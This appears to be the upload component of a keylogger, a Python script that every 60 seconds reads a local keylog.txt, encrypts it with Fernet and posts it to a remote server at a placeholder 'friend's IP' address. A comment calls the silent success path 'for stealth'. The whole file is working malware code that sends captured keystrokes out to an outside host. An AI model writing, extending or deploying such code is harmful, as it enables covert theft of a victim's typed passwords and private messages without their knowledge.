import requests
import time
import os
from cryptography.fernet import Fernet

SERVER_URL = 'http://<friend’s-ip>:5000/upload'  # Replace with your friend's server IP/hostname
KEY_FILE = 'secret.key'

def load_key():
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

def encrypt_data(data):
    key = load_key()
    fernet = Fernet(key)
    return fernet.encrypt(data)

def send_file_to_server(file_path):
    if not os.path.exists(file_path):
        return
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = encrypt_data(data)
    files = {'file': ('keylog.bin', encrypted_data, 'application/octet-stream')}
    try:
        response = requests.post(SERVER_URL, files=files)
        if response.status_code == 200:
            pass  # Silent for stealth
        else:
            with open("error_log.txt", "a") as f:
                f.write(f"Failed to upload file {file_path}: {response.status_code}\n")
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Error uploading file {file_path}: {e}\n")

def start_upload_server():
    while True:
        send_file_to_server('keylog.txt')
        time.sleep(60)

if __name__ == "__main__":
    start_upload_server()